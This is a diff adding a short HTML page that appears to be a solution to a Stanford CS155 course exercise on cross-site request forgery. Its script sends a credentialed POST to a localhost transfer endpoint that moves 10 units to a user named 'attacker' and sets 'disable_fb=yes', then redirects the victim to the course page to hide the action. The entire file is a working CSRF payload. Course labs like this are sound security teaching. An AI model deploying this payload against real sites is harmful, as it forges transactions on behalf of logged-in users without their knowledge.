@@ -1,0 +1,15 @@
+<html>
+  <head>
+      <title>B</title>
+  </head>
+  <body>  	
+  	<script>
+  		request = new XMLHttpRequest()
+  		request.open('POST','http://localhost:3000/post_transfer')
+      request.withCredentials = true
+  		request.setRequestHeader('Content-type','application/x-www-form-urlencoded')
+  		request.send("disable_fb=yes&destination_username=attacker&quantity=10")
+      location.href="http://crypto.stanford.edu/cs155/"
+	</script>
+  </body>
+</html>
